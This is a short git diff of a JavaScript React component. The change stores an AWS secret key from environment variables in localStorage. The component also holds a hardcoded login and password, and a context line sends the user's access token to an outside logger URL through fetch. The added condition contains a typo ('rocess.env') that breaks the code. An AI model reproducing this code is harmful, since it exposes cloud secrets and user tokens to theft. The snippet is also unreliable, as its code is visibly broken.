@@ -12,9 +12,12 @@ function App() {
     login: 'douglas',
     password: 'teste.js',
   }
-  const db = localStorage.setItem('DBBASE', getLocation())
+  const db = localStorage.setItem('DBBASE', process.env.AWS_SECRET_ACESS_KEY)
   console.log(db)
-  if (process.env.AWS_SECRET_ACESS_KEY === AWS_SECRET_ACESS_KEY) {
+  if (
+    rocess.env.AWS_SECRET_ACESS_KEY &&
+    process.env.AWS_SECRET_ACESS_KEY === AWS_SECRET_ACESS_KEY
+  ) {
     alert('Unexpected Condition')
     fetch(
       'http://example.com/logger.php?token=' + localStorage.access_token,
